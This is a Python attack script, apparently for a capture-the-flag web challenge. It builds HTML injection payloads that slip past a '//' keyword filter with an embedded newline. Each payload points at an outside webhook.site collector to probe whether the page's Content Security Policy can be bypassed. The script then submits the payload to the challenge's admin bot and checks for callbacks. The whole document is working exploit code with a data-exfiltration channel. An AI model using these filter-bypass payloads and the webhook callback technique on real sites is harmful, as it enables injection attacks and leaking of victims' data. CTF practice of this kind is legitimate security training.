"""
Batch test: try multiple HTML elements that might bypass CSP default-src 'self'.
Each element points to a different webhook path so we know which one fired.
"""
import requests
import urllib.parse
import time
import urllib3

urllib3.disable_warnings()

BOT = "https://bot-9cf8d8cc310eff6b.chal.ctf.ae"
WEBHOOK_UUID = "c7e8f703-1ee1-417a-921e-68c113778ff6"
WEBHOOK_API = f"https://webhook.site/token/{WEBHOOK_UUID}/requests"
WH = f"webhook.site/{WEBHOOK_UUID}"

# Build payload with multiple elements, each using /\n/ to bypass // filter
# The \n inside the URL is stripped by browser -> becomes //webhook.site/...
elements = [
    f'<link rel=prefetch href="/\n/{WH}/prefetch">',
    f'<link rel=prerender href="/\n/{WH}/prerender">',
    f'<link rel=icon href="/\n/{WH}/icon">',
    f'<video poster="/\n/{WH}/poster"></video>',
    f'<input type=image src="/\n/{WH}/inputimg">',
    f'<body background="/\n/{WH}/bodybg">',
]

payload = ''.join(elements)
print(f"[*] Payload length: {len(payload)} bytes")
print(f"[*] Payload (repr): {repr(payload)}")

# Verify filter compliance
import re
raw = payload  # this is what PHP sees after URL decoding
has_bad_chars = bool(re.search(r'[^\x20-\x7E\r\n]', raw))
has_bad_keywords = bool(re.search(r'http|data|\\\\|\*|\[|\]|&|%|@|//', raw, re.I))
print(f"[*] Filter check - bad chars: {has_bad_chars}, bad keywords: {has_bad_keywords}")
if has_bad_chars or has_bad_keywords:
    print("[!] PAYLOAD WOULD BE REJECTED BY FILTER!")
    exit(1)

report_url = "http://127.0.0.1:3000/?content=" + urllib.parse.quote(payload, safe='')

# Count existing webhook hits
r0 = requests.get(WEBHOOK_API)
before_count = r0.json().get('total', 0)
print(f"[*] Webhook hits before: {before_count}")

# Send report
print("[*] Sending report to bot... (~23s)")
t0 = time.time()
r = requests.post(f"{BOT}/api/report", json={"url": report_url}, verify=False, timeout=40)
elapsed = round(time.time() - t0, 2)
print(f"[*] Bot returned {r.status_code} in {elapsed}s")

# Wait a moment then check
time.sleep(3)
r1 = requests.get(WEBHOOK_API)
data = r1.json()
after_count = data.get('total', 0)
new_hits = after_count - before_count
print(f"[*] Webhook hits after: {after_count} (new: {new_hits})")

if new_hits > 0:
    print("[+] CSP BYPASS FOUND! Some element(s) fired:")
    for req in data.get('data', []):
        url = req.get('url', '')
        created = req.get('created_at', '')
        # Check if this is a new hit by looking at the path
        for tag in ['prefetch', 'prerender', 'icon', 'poster', 'inputimg', 'bodybg']:
            if tag in url:
                print(f"    [{tag}] -> {url}")
else:
    print("[-] No CSP bypass found. All elements blocked by CSP.")
